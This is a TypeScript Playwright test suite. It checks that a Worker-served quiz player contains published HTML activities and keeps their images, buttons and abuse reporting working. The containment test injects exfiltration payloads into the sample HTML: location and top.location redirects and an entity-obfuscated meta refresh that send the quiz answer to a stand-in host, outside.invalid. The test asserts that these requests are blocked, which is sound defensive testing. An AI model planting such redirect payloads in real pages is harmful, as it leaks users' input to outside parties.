import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { chromium, webkit, type Browser, type Page } from "playwright";
import worker from "../src/index";
import type { StudioEnv } from "../src/env";

const origin = "https://player.test";
const slug = "ABCDEFGHIJKLMNOPQRST";
const source = '<!doctype html><html lang="en"><head><meta name="viewport" content="width=device-width"><title>Quiz</title></head><body><img src="assets/image-1" alt="Diagram"><input id="answer" value="SYNTHETIC_ANSWER"><button onclick="this.textContent=\'Checked\'">Check</button></body></html>';

// The real Worker builds the response and security headers. Only its D1/R2
// collaborators are stubbed; no provider, production or external request runs.
function environment(html: string): StudioEnv {
  return {
    PUBLIC_PLAYER_ORIGIN: origin,
    DB: {
      prepare(sql: string) {
        return { bind: () => ({ first: async () => {
          if (sql.includes("FROM publications WHERE slug=")) return {
            slug, artifact_id: "artifact", revision_id: "revision", owner_hash: "owner",
            title: "Quiz", source_hash: "source", created_at: "2026-01-01T00:00:00Z",
            expires_at: "2099-01-01T00:00:00Z", revoked_at: null,
          };
          if (sql.includes("JOIN revision_assets")) return { ok: 1 };
          if (sql.includes("FROM assets WHERE id")) return {
            id: "image-1", owner_hash: "owner", object_key: "assets/image-1",
            content_type: "image/svg+xml", byte_length: 120, width: 20, height: 20,
            sha256: "image", alternative_text: "Diagram", decorative: 0,
            created_at: "2026-01-01T00:00:00Z",
          };
          throw new Error(`Unexpected test query: ${sql}`);
        } }) };
      },
    },
    MEDIA: { get: async (key: string) => {
      if (key === "sources/source.html") return { text: async () => html };
      if (key === "assets/image-1") return {
        body: '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" fill="blue"/></svg>',
        httpEtag: "image",
        writeHttpMetadata(headers: Headers) { headers.set("content-type", "image/svg+xml"); },
      };
      return null;
    } },
  } as unknown as StudioEnv;
}

describe.each([["Chromium", chromium], ["WebKit", webkit]] as const)("published activity containment (%s)", (_name, engine) => {
  let browser: Browser;
  beforeAll(async () => { browser = await engine.launch(); });
  afterAll(async () => { await browser.close(); });

  async function open(html: string, width = 1024, height = 768) {
    const context = await browser.newContext({ viewport: { width, height } });
    const page = await context.newPage();
    const external: string[] = [];
    const assets: string[] = [];
    const reports: unknown[] = [];
    const env = environment(html);
    await context.route("**/*", async (route) => {
      const request = route.request(), url = new URL(request.url());
      if (url.origin !== origin) {
        external.push(url.href);
        await route.abort();
        return;
      }
      if (url.pathname === `/v1/publications/${slug}/reports`) {
        if (request.method() === "POST") reports.push(request.postDataJSON());
        await route.fulfill({
          status: request.method() === "OPTIONS" ? 204 : 201,
          headers: {
            "access-control-allow-origin": "*",
            "access-control-allow-methods": "POST",
            "access-control-allow-headers": "content-type",
          },
          body: request.method() === "OPTIONS" ? "" : "{}",
        });
        return;
      }
      if (url.pathname.includes("/assets/")) assets.push(url.pathname);
      const response = await worker.fetch(new Request(request.url()), env);
      const headers: Record<string, string> = {};
      response.headers.forEach((value, name) => { headers[name] = value; });
      await route.fulfill({
        status: response.status,
        headers,
        body: Buffer.from(await response.arrayBuffer()),
      });
    });
    await page.goto(`${origin}/${slug}`, { waitUntil: "load" });
    return { context, page, external, assets, reports };
  }

  function activity(page: Page) {
    return page.frames().find((frame) => frame.url() === "about:srcdoc") ?? page.mainFrame();
  }

  it("places the scoped base in the real head, not a preceding comment", async () => {
    const state = await open(source.replace("<head>", "<!-- explain <head> here --><head>"));
    try {
      await activity(state.page).getByRole("img", { name: "Diagram" }).waitFor();
      expect(await activity(state.page).locator("head base").count()).toBe(1);
      expect(await activity(state.page).locator("head base").getAttribute("href")).toBe(`/${slug}/`);
      expect(state.assets).toEqual([`/${slug}/assets/image-1`]);
      expect(await activity(state.page).evaluate("document.querySelector('img').naturalWidth")).toBe(20);
    } finally { await state.context.close(); }
  });

  it.each(["location", "encoded refresh", "top location"])("contains %s without sending the answer outside", async (payload) => {
    const html = payload === "encoded refresh"
      ? source.replace("</head>", '<meta http-equiv="&#114;efresh" content="0;url=https://outside.invalid/collect?answer=SYNTHETIC_ANSWER"></head>')
      : source.replace("this.textContent='Checked'", `${payload === "top location" ? "top.location" : "location"}='https://outside.invalid/collect?answer='+answer.value`);
    const state = await open(html);
    try {
      if (payload !== "encoded refresh") await activity(state.page).getByRole("button", { name: "Check", exact: true }).click();
      await state.page.waitForTimeout(150);
      expect(state.external).toEqual([]);
      expect(state.page.url()).toBe(`${origin}/${slug}`);
      expect(await state.page.getByRole("button", { name: "Report this activity", exact: true }).count()).toBe(1);
    } finally { await state.context.close(); }
  });

  it.each([[390, 844], [1024, 768]])("keeps images, interactions and reporting usable at %sx%s", async (width, height) => {
    const state = await open(source, width, height);
    try {
      const frame = activity(state.page);
      await frame.getByRole("button", { name: "Check", exact: true }).click();
      expect(await frame.getByRole("button", { name: "Checked", exact: true }).count()).toBe(1);
      expect(await frame.evaluate("document.querySelector('img').naturalWidth")).toBe(20);
      expect(await frame.evaluate("innerWidth")).toBe(width);
      state.page.once("dialog", (dialog) => { void dialog.accept("accessibility"); });
      const report = state.page.getByRole("button", { name: "Report this activity", exact: true });
      await report.click();
      await expect.poll(() => report.textContent()).toBe("Report sent");
      expect(state.reports).toEqual([{ reason: "accessibility" }]);
      expect(state.external).toEqual([]);
    } finally { await state.context.close(); }
  });
});
